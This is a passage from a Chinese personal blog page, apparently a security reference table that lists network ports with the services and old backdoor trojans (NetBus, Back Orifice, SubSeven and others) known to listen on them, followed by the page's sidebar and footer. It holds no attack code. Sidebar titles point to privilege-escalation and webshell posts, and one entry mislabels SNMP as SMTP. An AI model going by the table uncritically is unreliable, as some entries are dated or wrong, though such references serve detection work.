+端口：7789<br />
+服务：[NULL]<br />
+说明：木马ICKiller开放此端口。<br />
+端口：8000<br />
+服务：OICQ<br />
+说明：腾讯QQ服务器端开放此端口。 &#8216;<br />
+端口：8010<br />
+服务：Wingate<br />
+说明：Wingate代理开放此端口。<br />
+端口：8080<br />
+服务：代理端口<br />
+说明：WWW代理开放此端口。<br />
+端口：9400、9401、9402<br />
+服务：[NULL]<br />
+说明：木马Incommand 1.0开放此端口。<br />
+端口：9872、9873、9874、9875、10067、10167<br />
+服务：[NULL]<br />
+说明：木马Portal of Doom开放此端口<br />
+端口：9989<br />
+服务：[NULL]</p>
+<p style="color: #969696; padding-left: 30px;">
+说明：木马iNi-Killer开放此端口。<br />
+端口：11000<br />
+服务：[NULL]<br />
+说明：木马SennaSpy开放此端口。<br />
+端口：11223<br />
+服务：[NULL]<br />
+说明：木马Progenic trojan开放此端口。<br />
+端口：12076、61466<br />
+服务：[NULL]<br />
+说明：木马Telecommando开放此端口。<br />
+端口：12223<br />
+服务：[NULL]<br />
+说明：木马Hack&#8217;99 KeyLogger开放此端口。<br />
+端口：12345、12346<br />
+服务：[NULL]<br />
+说明：木马NetBus1.60/1.70、GabanBus开放此端口。<br />
+端口：12361<br />
+服务：[NULL]<br />
+说明：木马Whack-a-mole开放此端口。<br />
+端口：13223<br />
+服务：PowWow<br />
+说明：PowWow是Tribal Voice的聊天程序。它允许用户在此端口打开私人聊天的连接。这一程序对于建立连接非常具有攻击性。它会驻扎在这个TCP端口等回应。造成类似心跳间隔的连接请求。如果一个拨号用户从另一个聊天者手中继承了IP地址就会发生好象有很多不同的人在测试这个端口的情况。这一协议使用OPNG作为其连接请求的前4个字节。</p>
+<p style="color: #969696; padding-left: 30px;">端口：16969<br />
+服务：[NULL]<br />
+说明：木马Priority开放此端口。<br />
+端口：17027<br />
+服务：Conducent<br />
+说明：这是一个外向连接。这是由于公司内部有人安装了带有Conducent&#8221;adbot&#8221;的共享软件。Conducent&#8221;adbot&#8221;是为共享软件显示广告服务的。使用这种服务的一种流行的软件是Pkware。<br />
+端口：19191<br />
+服务：[NULL]<br />
+说明：木马蓝色火焰开放此端口。<br />
+端口：20000、20001<br />
+服务：[NULL]<br />
+说明：木马Millennium开放此端口。<br />
+端口：20034<br />
+服务：[NULL]<br />
+说明：木马NetBus Pro开放此端口。<br />
+端口：21554<br />
+服务：[NULL]</p>
+<p style="color: #969696; padding-left: 30px;">
+说明：木马GirlFriend开放此端口。<br />
+端口：22222<br />
+服务：[NULL]<br />
+说明：木马Prosiak开放此端口。</p>
+<p style="color: #969696; padding-left: 30px;">
+端口：23456<br />
+服务：[NULL]<br />
+说明：木马Evil FTP、Ugly FTP开放此端口。<br />
+端口：26274、47262<br />
+服务：[NULL]<br />
+说明：木马Delta开放此端口。<br />
+端口：27374<br />
+服务：[NULL]<br />
+说明：木马Subseven 2.1开放此端口。<br />
+端口：30100<br />
+服务：[NULL]<br />
+说明：木马NetSphere开放此端口。<br />
+端口：30303<br />
+服务：[NULL]<br />
+说明：木马Socket23开放此端口。<br />
+端口：30999<br />
+服务：[NULL]<br />
+说明：木马Kuang开放此端口。<br />
+端口：31337、31338<br />
+服务：[NULL]<br />
+说明：木马BO(Back Orifice)开放此端口。另外木马DeepBO也开放31338端口。<br />
+端口：31339<br />
+服务：[NULL]<br />
+说明：木马NetSpy DK开放此端口。<br />
+端口：31666<br />
+服务：[NULL]<br />
+说明：木马BOWhack开放此端口。</p>
+<p style="color: #969696; padding-left: 30px;">端口：33333<br />
+服务：[NULL]<br />
+说明：木马Prosiak开放此端口。<br />
+端口：34324<br />
+服务：[NULL]<br />
+说明：木马Tiny Telnet Server、BigGluck、TN开放此端口。<br />
+端口：40412<br />
+服务：[NULL]<br />
+说明：木马The Spy开放此端口。<br />
+端口：40421、40422、40423、40426、</p>
+<p style="color: #969696; padding-left: 30px;">
+服务：[NULL]<br />
+说明：木马Masters Paradise开放此端口。<br />
+端口：43210、54321<br />
+服务：[NULL]<br />
+说明：木马SchoolBus 1.0/2.0开放此端口。<br />
+端口：44445<br />
+服务：[NULL]<br />
+说明：木马Happypig开放此端口。<br />
+端口：50766<br />
+服务：[NULL]<br />
+说明：木马Fore开放此端口。</p>
+<p style="color: #969696; padding-left: 30px;">端口：53001<br />
+服务：[NULL]<br />
+说明：木马Remote Windows Shutdown开放此端口。<br />
+端口：65000<br />
+服务：[NULL]<br />
+说明：木马Devil 1.03开放此端口。<br />
+端口：88<br />
+说明：Kerberos krb5。另外TCP的88端口也是这个用途。<br />
+端口：137<br />
+说明：SQL Named Pipes encryption over other protocols name lookup(其他协议名称查找上的SQL命名管道加密技术)和SQL RPC encryption over other protocols name lookup(其他协议名称查找上的SQL RPC加密技术)和Wins NetBT name service(WINS NetBT名称服务)和Wins Proxy都用这个端口。<br />
+端口：161<br />
+说明：Simple Network Management Protocol(SMTP)（简单网络管理协议）<br />
+端口：162<br />
+说明：SNMP Trap（SNMP陷阱）<br />
+端口：445<br />
+说明：Common Internet File System(CIFS)（公共Internet文件系统）<br />
+端口：464<br />
+说明：Kerberos kpasswd(v5)。另外TCP的464端口也是这个用途。</p>
+<p style="color: #969696; padding-left: 30px;">端口：500<br />
+说明：Internet Key Exchange(IKE)（Internet密钥交换）<br />
+端口：1645、1812<br />
+说明：Remot Authentication Dial-In User Service(RADIUS)authentication(Routing and Remote Access)(远程认证拨号用户服务)<br />
+端口：1646、1813<br />
+说明：RADIUS accounting(Routing and Remote Access)(RADIUS记帐（路由和远程访问）)<br />
+端口：1701<br />
+说明：Layer Two Tunneling Protocol(L2TP)(第2层隧道协议)<br />
+端口：1801、3527</p>
+<p style="color: #969696; padding-left: 60px;">
+说明：Microsoft Message Queue Server(Microsoft消息队列服务器)。还有TCP的135、1801、2101、2103、2105也是同样的用途。<br />
+端口：2504<br />
+说明：Network Load Balancing(网络平衡负荷)<br />
+0 通常用于分析操作系统。这一方法能够工作是因为在一些系统中“0”是无效端口，当你试图使用一种通常的闭合端口<br />
+连接它时将产生不同的结果。一种典型的扫描：使用IP地址为0.0.0.0，设置ACK位并在以太网层广播。</p>
+				<span class="align_left">&laquo; Prev：<a href="http://blog.whatisit.cn/wp-content/plugins/really-static/static/p=1078/index.html" rel="prev">荷兰少年Boyan Slat</a></span>
+				<span class="align_right"><a href="http://blog.whatisit.cn/wp-content/plugins/really-static/static/p=1084/index.html" rel="next">解决用U盘安装Linux时候出现cd-rom无法挂载</a>：Next &raquo;</span>
+			</div>
+		</div>
+
+	<!-- You can start editing here. -->
+
+		
+<div class="comments-navi"></div>
+
+
+<div id="respond">
+<form action="http://blog.whatisit.cn/wp-comments-post.php" method="post" id="commentform">
+<h4 class="clear">Leave a Reply</h4>
+
+
+
+<div id="author_info">
+<p><input type="text" name="author" id="author" value="" size="22" tabindex="1" aria-required='true' />
+<label for="author">Name  </label></p>
+
+<p><input type="text" name="email" id="email" value="" size="22" tabindex="2" aria-required='true' />
+<label for="email">Mail (will not be published)  </label></p>
+
+<p><input type="text" name="url" id="url" value="" size="22" tabindex="3" />
+<label for="url">Website</label></p>
+	</div>
+	
+<p><textarea name="comment" id="comment" cols="5" rows="10" tabindex="4" onkeydown="if(event.ctrlKey&&event.keyCode==13){document.getElementById('submit').click();return false};"></textarea></p>
+
+<p><input name="submit" type="submit" id="submit" tabindex="5" class="subin" value="" />
+ <input type='hidden' name='comment_post_ID' value='1082' id='comment_post_ID' />
+<input type='hidden' name='comment_parent' id='comment_parent' value='0' />
+ 
+</p><div id="cancel_reply"><a rel="nofollow" id="cancel-comment-reply-link" href="/?p=1082#respond" style="display:none;">点击这里取消回复。</a></div>
+</form>
+</div>
+
+	
+            <div class="content_foot conleft"></div>
+        </div>
+        
+	<div id="sidebar" role="complementary">
+		<!-- Search Start -->
+		<div id="search">
+			<form method="get" id="searchform" action="http://blog.whatisit.cn/wp-content/plugins/really-static/static/">
+				<span class="st"><input type="text" value="" name="s" id="s" class="searchtxt" /></span><span class="ss"><input type="submit" name="submit" value="" class="searchsm" /></span>
+			</form>
+		</div>
+		<div class="clear"></div>
+		<!-- Search End -->
+		<ul>
+			<li id="search-2" class="widget widget_search"><form role="search" method="get" id="searchform" class="searchform" action="http://blog.whatisit.cn/wp-content/plugins/really-static/static/">
+				<div>
+					<label class="screen-reader-text" for="s">搜索：</label>
+					<input type="text" value="" name="s" id="s" />
+					<input type="submit" id="searchsubmit" value="搜索" />
+				</div>
+			</form></li>
+		<li id="recent-posts-2" class="widget widget_recent_entries">		<h2 class="widgettitle">近期文章</h2>
+		<ul>
+					<li>
+				<a href="http://blog.whatisit.cn/wp-content/plugins/really-static/static/p=1137/index.html">Windows下降权MYSQL和apche的运行级别</a>
+						</li>
+					<li>
+				<a href="http://blog.whatisit.cn/wp-content/plugins/really-static/static/p=1135/index.html">[转]windows2008 mysql 提权</a>
+						</li>
+					<li>
+				<a href="http://blog.whatisit.cn/wp-content/plugins/really-static/static/p=1133/index.html">PHP一句话</a>
+						</li>
+					<li>
+				<a href="http://blog.whatisit.cn/wp-content/plugins/really-static/static/p=1130/index.html">[轉]怎样在CentOS 7.0上安装和配置VNC服务器</a>
+						</li>
+					<li>
+				<a href="http://blog.whatisit.cn/wp-content/plugins/really-static/static/p=1128/index.html">Shadowsocks优化方案</a>
+						</li>
+				</ul>
+		</li>
+		<li id="recent-comments-2" class="widget widget_recent_comments"><h2 class="widgettitle">近期评论</h2>
+<ul id="recentcomments"><li class="recentcomments"><span class="comment-author-link"><a href='http://weibo.com/tyand' rel='external nofollow' class='url'>韻秋</a></span>发表在《<a href="http://blog.whatisit.cn/wp-content/plugins/really-static/static/page_id=47/index.html#comment-85">自省三聲</a>》</li><li class="recentcomments"><span class="comment-author-link"><a href='http://weibo.com/tyand' rel='external nofollow' class='url'>韻秋</a></span>发表在《<a href="http://blog.whatisit.cn/wp-content/plugins/really-static/static/page_id=870/index.html#comment-100">IT便利貼</a>》</li><li class="recentcomments"><span class="comment-author-link"><a href='http://weibo.com/tyand' rel='external nofollow' class='url'>韻秋</a></span>发表在《<a href="http://blog.whatisit.cn/wp-content/plugins/really-static/static/page_id=870/index.html#comment-99">IT便利貼</a>》</li><li class="recentcomments"><span class="comment-author-link"><a href='http://weibo.com/tyand' rel='external nofollow' class='url'>韻秋</a></span>发表在《<a href="http://blog.whatisit.cn/wp-content/plugins/really-static/static/page_id=870/index.html#comment-98">IT便利貼</a>》</li><li class="recentcomments"><span class="comment-author-link"><a href='http://weibo.com/tyand' rel='external nofollow' class='url'>韻秋</a></span>发表在《<a href="http://blog.whatisit.cn/wp-content/plugins/really-static/static/page_id=47/index.html#comment-84">自省三聲</a>》</li></ul></li>
+<li id="archives-2" class="widget widget_archive"><h2 class="widgettitle">文章归档</h2>
+		<ul>
+			<li><a href='http://blog.whatisit.cn/wp-content/plugins/really-static/static/m=201604/index.html'>2016年四月</a></li>
+	<li><a href='http://blog.whatisit.cn/wp-content/plugins/really-static/static/m=201603/index.html'>2016年三月</a></li>
+	<li><a href='http://blog.whatisit.cn/wp-content/plugins/really-static/static/m=201602/index.html'>2016年二月</a></li>
+	<li><a href='http://blog.whatisit.cn/wp-content/plugins/really-static/static/m=201601/index.html'>2016年一月</a></li>
+	<li><a href='http://blog.whatisit.cn/wp-content/plugins/really-static/static/m=201512/index.html'>2015年十二月</a></li>
+	<li><a href='http://blog.whatisit.cn/wp-content/plugins/really-static/static/m=201511/index.html'>2015年十一月</a></li>
+	<li><a href='http://blog.whatisit.cn/wp-content/plugins/really-static/static/m=201510/index.html'>2015年十月</a></li>
+	<li><a href='http://blog.whatisit.cn/wp-content/plugins/really-static/static/m=201509/index.html'>2015年九月</a></li>
+	<li><a href='http://blog.whatisit.cn/wp-content/plugins/really-static/static/m=201508/index.html'>2015年八月</a></li>
+	<li><a href='http://blog.whatisit.cn/wp-content/plugins/really-static/static/m=201507/index.html'>2015年七月</a></li>
+	<li><a href='http://blog.whatisit.cn/wp-content/plugins/really-static/static/m=201505/index.html'>2015年五月</a></li>
+	<li><a href='http://blog.whatisit.cn/wp-content/plugins/really-static/static/m=201504/index.html'>2015年四月</a></li>
+	<li><a href='http://blog.whatisit.cn/wp-content/plugins/really-static/static/m=201503/index.html'>2015年三月</a></li>
+	<li><a href='http://blog.whatisit.cn/wp-content/plugins/really-static/static/m=201502/index.html'>2015年二月</a></li>
+	<li><a href='http://blog.whatisit.cn/wp-content/plugins/really-static/static/m=201501/index.html'>2015年一月</a></li>
+	<li><a href='http://blog.whatisit.cn/wp-content/plugins/really-static/static/m=201412/index.html'>2014年十二月</a></li>
+	<li><a href='http://blog.whatisit.cn/wp-content/plugins/really-static/static/m=201411/index.html'>2014年十一月</a></li>
+	<li><a href='http://blog.whatisit.cn/wp-content/plugins/really-static/static/m=201405/index.html'>2014年五月</a></li>
+	<li><a href='http://blog.whatisit.cn/wp-content/plugins/really-static/static/m=201404/index.html'>2014年四月</a></li>
+	<li><a href='http://blog.whatisit.cn/wp-content/plugins/really-static/static/m=201403/index.html'>2014年三月</a></li>
+	<li><a href='http://blog.whatisit.cn/wp-content/plugins/really-static/static/m=201402/index.html'>2014年二月</a></li>
+	<li><a href='http://blog.whatisit.cn/wp-content/plugins/really-static/static/m=201401/index.html'>2014年一月</a></li>
+		</ul>
+		</li>
+<li id="categories-2" class="widget widget_categories"><h2 class="widgettitle">分类目录</h2>
+		<ul>
+	<li class="cat-item cat-item-11"><a href="http://blog.whatisit.cn/wp-content/plugins/really-static/static/cat=11/index.html" >Development</a>
+</li>
+	<li class="cat-item cat-item-12"><a href="http://blog.whatisit.cn/wp-content/plugins/really-static/static/cat=12/index.html" >Linux</a>
+</li>
+	<li class="cat-item cat-item-13"><a href="http://blog.whatisit.cn/wp-content/plugins/really-static/static/cat=13/index.html" >Safe for Network</a>
+</li>
+	<li class="cat-item cat-item-14"><a href="http://blog.whatisit.cn/wp-content/plugins/really-static/static/cat=14/index.html" >Serveice for Net</a>
+</li>
+	<li class="cat-item cat-item-15"><a href="http://blog.whatisit.cn/wp-content/plugins/really-static/static/cat=15/index.html" >Server For Win</a>
+</li>
+	<li class="cat-item cat-item-1"><a href="http://blog.whatisit.cn/wp-content/plugins/really-static/static/cat=1/index.html" >未分类</a>
+</li>
+	<li class="cat-item cat-item-3"><a href="http://blog.whatisit.cn/wp-content/plugins/really-static/static/cat=3/index.html" title="江湖恩怨几时休
+策马相依四海游
+几度春秋
+终是一朝泯恩仇
+
+">江湖舊事</a>
+</li>
+	<li class="cat-item cat-item-4"><a href="http://blog.whatisit.cn/wp-content/plugins/really-static/static/cat=4/index.html" >江湖軼卷</a>
+</li>
+	<li class="cat-item cat-item-5"><a href="http://blog.whatisit.cn/wp-content/plugins/really-static/static/cat=5/index.html" >浮生度秋技術宅</a>
+</li>
+	<li class="cat-item cat-item-6"><a href="http://blog.whatisit.cn/wp-content/plugins/really-static/static/cat=6/index.html" >破塵妖月</a>
+</li>
+	<li class="cat-item cat-item-8"><a href="http://blog.whatisit.cn/wp-content/plugins/really-static/static/cat=8/index.html" title="汝道 天道 道之所道
+吾道 心道 道汝道之所道">道是道痕</a>
+</li>
+	<li class="cat-item cat-item-9"><a href="http://blog.whatisit.cn/wp-content/plugins/really-static/static/cat=9/index.html" >附庸風雅</a>
+</li>
+	<li class="cat-item cat-item-10"><a href="http://blog.whatisit.cn/wp-content/plugins/really-static/static/cat=10/index.html" >麗魅魍魎</a>
+</li>
+		</ul>
+</li>
+<li id="meta-2" class="widget widget_meta"><h2 class="widgettitle">功能</h2>
+			<ul>
+						<li><a href="http://blog.whatisit.cn/wp-content/plugins/really-static/static/wp-login.php">登录</a></li>
+			<li><a href="http://blog.whatisit.cn/wp-content/plugins/really-static/static/?feed=rss2">文章<abbr title="Really Simple Syndication">RSS</abbr></a></li>
+			<li><a href="http://blog.whatisit.cn/wp-content/plugins/really-static/static/?feed=comments-rss2">评论<abbr title="Really Simple Syndication">RSS</abbr></a></li>
+			<li><a href="https://cn.wordpress.org/" title="基于WordPress，一个优美、先进的个人信息发布平台。">WordPress.org</a></li>			</ul>
+			</li>
+					</ul>
+  </div>
+       </div>
+
+<div id="footer" class="clear">
+       	 <div class="wrap">
+             <span><font  color="#d0d0d0"> 41 queries in 0.210 seconds.</font></span>
+         </div>
+</div>
+</div>
+<div id="wp-auto-top"><div id="wp-auto-top-top"></div><div id="wp-auto-top-comment"></div><div id="wp-auto-top-bottom"></div></div>
+<script> var commentPositionId = '#comments';var wpAutoTopSpeed = 1;</script><style>
+   #wp-auto-top{position:fixed;top:80%;right:50%;display:block;margin-right:-43%; z-index:9999;}
+   #wp-auto-top-top,#wp-auto-top-comment,#wp-auto-top-bottom{background:url(http://blog.whatisit.cn/wp-content/plugins/wp-auto-top/img/23.png) no-repeat;position:relative;cursor:pointer;height:25px;width:29px;margin:10px 0 0;}
+   #wp-auto-top-comment{background-position:left -30px;height:32px;}#wp-auto-top-bottom{background-position:left -68px;}
+   #wp-auto-top-comment:hover{background-position:right -30px;}
+   #wp-auto-top-top:hover{background-position:right 0;}
+   #wp-auto-top-bottom:hover{background-position:right -68px ;}
+   </style><script type='text/javascript' src='http://blog.whatisit.cn/wp-includes/js/comment-reply.min.js?ver=4.6.1'></script>
+<script type='text/javascript' src='http://blog.whatisit.cn/wp-includes/js/wp-embed.min.js?ver=4.6.1'></script>
+<script type='text/javascript' src='http://blog.whatisit.cn/wp-includes/js/jquery/jquery.js?ver=1.12.4'></script>
+<script type='text/javascript' src='http://blog.whatisit.cn/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1'></script>
+<script type='text/javascript' src='http://blog.whatisit.cn/wp-content/plugins/wp-auto-top/wp-auto-top.js?ver=4.6.1'></script>
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "//hm.baidu.com/hm.js?99868b1eadabc674ab444818b2d365cb";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+</body>
+</html>
+
+<!-- Dynamic page generated in 0.207 seconds. -->
+<!-- Cached page generated by WP-Super-Cache on 2016-11-15 20:30:50 -->
